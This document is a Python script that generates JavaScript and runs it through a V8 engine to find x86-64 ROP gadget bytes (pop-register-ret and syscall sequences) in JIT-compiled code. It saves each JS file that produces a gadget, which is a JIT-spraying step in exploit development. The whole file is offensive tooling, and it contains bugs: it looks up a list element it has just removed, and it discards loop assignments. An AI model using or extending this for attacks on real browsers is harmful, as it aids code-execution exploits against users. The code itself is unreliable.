import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
dd = [0, 0]
exec_path = ''

def excute_js(js:str)->bool:
    f = open('test.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code test.js > test.txt')
    f = open('test.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('lea') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    print(words)
                    gadgets.remove(jsc)
                    os.system('cp test.js ' + jsc + str(dd[gadgets.index(jsc)]) + '.js')
                    dd[gadgets.index(jsc)] += 1

def generate_js(count:int):
    ops = ['&', '*']
    header = '''
var array = new Uint8Array();
function syscall_jsc(var1, var2, var3, var4){    
    var a0 = var1 + 0x111;
    var a1 = var1 + 0x112;
    var a2 = var1 + 0x113;
'''

    base = 114
    middle1 = ''
    for i in range(count):
        var = 't' + str(i)
        middle1 += '\tvar ' + var + ' = var1 + 0x' + str(base) + ';\n'
        base += 1
    
    jscs = []
    jsc = '\tvar s = a0 * 2 + a1 + 0xc3;\n    return a0 | a1 + a2 |'
    jscs.append(jsc)
    jsc = '\tvar s = a0 * 2 + a2 + 0xc3;\n    return a0 | a1 + a2 |'
    jscs.append(jsc)
    jsc = '\tvar s = a1 * 2 + a2 + 0xc3;\n    return a0 | a1 + a2 |'
    jscs.append(jsc)

    for i in range(count):
        jsc = '\tvar s = a0 * 2' + ' + t' + str(i) + ' + 0xc3;\n    return a0 | a1 + a2 |'
        jsc = '\tvar s = a1 * 2' + ' + t' + str(i) + ' + 0xc3;\n    return a0 | a1 + a2 |'
        jsc = '\tvar s = a2 * 2' + ' + t' + str(i) + ' + 0xc3;\n    return a0 | a1 + a2 |'
        for j in range(i, count):
            if i == j:
                continue
            jsc = '\tvar s = t' + str(i) + '*2 + t' + str(j) + ' + 0xc3;\n    return a0 | a1 + a2 |'
            jscs.append(jsc)

    middle2 = ''
    op2s = ['+', '|']
    for i in range(count - 1):
        middle2 += 't' + str(i) + ' ' + '+ '
    middle2 += 't' + str(count-1) + ' | s;\n}'

    tail = '''
for(var i = 0; i < 0x10000; i++)
{
    syscall_jsc(0xc35, 0xc22, 0xc32, 0xc55);
}
'''
    for jsc in jscs:
        excute_js(header + middle1 + jsc + middle2 + tail)
    # return header + middle1 + jsc + middle2 + tail


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()


    for i in range(24):
        generate_js(i)
    print('done')